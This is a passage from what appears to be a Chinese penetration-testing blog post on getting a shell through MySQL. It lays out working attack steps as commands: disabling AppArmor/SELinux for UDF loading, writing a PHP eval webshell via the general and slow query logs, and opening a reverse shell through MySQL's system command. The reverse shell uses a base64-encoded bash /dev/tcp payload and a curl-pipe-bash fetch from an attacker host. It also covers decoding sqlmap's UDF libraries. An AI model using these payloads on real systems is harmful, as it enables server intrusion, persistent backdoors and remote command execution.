src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221824261.png" class="" title="image-20210131221824261"><p>unbutu通过<code>service apparmor teardown</code>关闭apparmor安全模式，并设置/usr/lib/mysql/plugin权限为777</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131223336103.png" class="" title="image-20210131223336103"></li></ol><p>若是centos ，修改<code>/etc/sysconfig/selinux</code>文件<code>SELINUX=disabled</code>来禁用安全模式</p><p>3.将绝对路径导致so文件找不到，去掉路径即可</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620172930780.png" class="" title="image-20210620172930780"><h2 id="0x03-开启全局日志写入shell"><a href="#0x03-开启全局日志写入shell" class="headerlink" title="0x03 开启全局日志写入shell"></a>0x03 开启全局日志写入shell</h2><p>前两个利用方法都受到secure_file_priv的限制，我们可以通过全局日志或慢查询日志写shell绕过该限制</p><p><strong>条件</strong></p><p>1.root权限执行的Mysql</p><p>2.网站的绝对路径且具有写入权限</p><p><strong>利用步骤</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>; #开启全局配置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/var/WWW/shell.php&#x27;</span>; #将日志文件设置成服务器下的木马文件</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span>; #执行<span class="keyword">sql</span>语句，mysql会将我没执行的语句记录到日志文件(上一步修改后的文件)中</span><br></pre></td></tr></table></figure><h2 id="0x04-开启慢查询日志写入shell"><a href="#0x04-开启慢查询日志写入shell" class="headerlink" title="0x04 开启慢查询日志写入shell"></a>0x04 开启慢查询日志写入shell</h2><p><strong>条件</strong></p><p>1.root权限执行的Mysql</p><p>2.网站的绝对路径且具有写入权限</p><p><strong>利用步骤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%slow_query_log%&#39;; #查看慢查询日志开启情况</span><br><span class="line">set global slow_query_log&#x3D;1; #开启慢查询日志</span><br><span class="line">set global slow_query_log_file&#x3D;&#39;&#x2F;var&#x2F;WWW&#x2F;shell.php&#39;; #修改日志文件存储的绝对路径</span><br><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; or sleep(11); #向日志文件中写入shell</span><br></pre></td></tr></table></figure><h2 id="0x05-利用system函数反弹shell"><a href="#0x05-利用system函数反弹shell" class="headerlink" title="0x05 利用system函数反弹shell"></a>0x05 利用system函数反弹shell</h2><p>mysql在5.7版本之后自带有个system函数，可以直接执行命令</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620180803889.png" class="" title="image-20210620180803889"><p><strong>条件</strong></p><p>1.mysql版本大于5.7</p><p><strong>利用步骤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#base64编码后反弹</span><br><span class="line">system bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xNDIvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;;</span><br><span class="line">#利用curl访问攻击者web服务器，shell.html内容为bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">system curl 192.168.112.142&#x2F;shell.html|bash;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="0x06-小知识点"><a href="#0x06-小知识点" class="headerlink" title="0x06 小知识点"></a>0x06 小知识点</h2><h3 id="secure-file-priv在不同mysql版本的区别"><a href="#secure-file-priv在不同mysql版本的区别" class="headerlink" title="secure_file_priv在不同mysql版本的区别"></a><strong>secure_file_priv在不同mysql版本的区别</strong></h3><p>mysql5.5之前secure_file_priv默认是空，这个情况可以让任何绝对路径写文件，</p><p>mysql5.5-5.7，secure_file_priv默认是NULL，限制mysqld 不允许导入 | 导出，</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131155508820.png" class="" title="image-20210131155508820"><p>mysql版本5.7之后，secure_file_priv是默认目录,限制mysqld 的导入 | 导出 只能发生在限定目录下。</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131152927985.png" class="" title="image-20210131152927985"><h3 id="如何获取该udf-dll-so-文件的16进制值-hex"><a href="#如何获取该udf-dll-so-文件的16进制值-hex" class="headerlink" title="如何获取该udf.dll(.so)文件的16进制值(hex)"></a><strong>如何获取该udf.dll(.so)文件的16进制值(hex)</strong></h3><p>我们可以本地搭建mysql环境 找个可以用的udf.dll文件 执行下面操作</p><p>mysql&gt; select hex(load_file (‘c:/windows/temp/xxoo.dll’)) into outfile ‘c:/windows/temp/xxoo.txt’;</p><h3 id="sqlmap的udf-dll-so-是通过异或编码的，使用之前需要解码"><a href="#sqlmap的udf-dll-so-是通过异或编码的，使用之前需要解码" class="headerlink" title="sqlmap的udf.dll(.so)是通过异或编码的，使用之前需要解码"></a><strong>sqlmap的udf.dll(.so)是通过异或编码的，使用之前需要解码</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解码工具为sqlmap自带的SQLmap\extra\cloak\cloak.py</span></span><br><span class="line">python cloak.py <span class="literal">-d</span> <span class="literal">-i</span> G:\tools\SQLmap\udf\mysql\windows\<span class="number">64</span>\lib_mysqludf_sys.dll_</span><br><span class="line">python cloak.py <span class="literal">-d</span> <span class="literal">-i</span> G:\tools\SQLmap\udf\mysql\linux\<span class="number">64</span>\lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131161956660.png" class="" title="image-20210131161956660"><h3 id="dumpfile和outfile有什么不一样"><a href="#dumpfile和outfile有什么不一样" class="headerlink" title="dumpfile和outfile有什么不一样"></a><strong>dumpfile和outfile有什么不一样</strong></h3><p>outfile适合导库，会在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</p><p>into dumpfile 就能导出 一个完整能执行的2进制文件。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://www.cnblogs.com/sijidou/p/10522972.html" >udf提权<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://blog.csdn.net/weixin_39872872/article/details/112589789" >写入mysql_通过MySQL写入webshell的几种方式<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.cnblogs.com/milantgh/p/5444398.html" >mysql dumpfile与outfile函数的区别<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
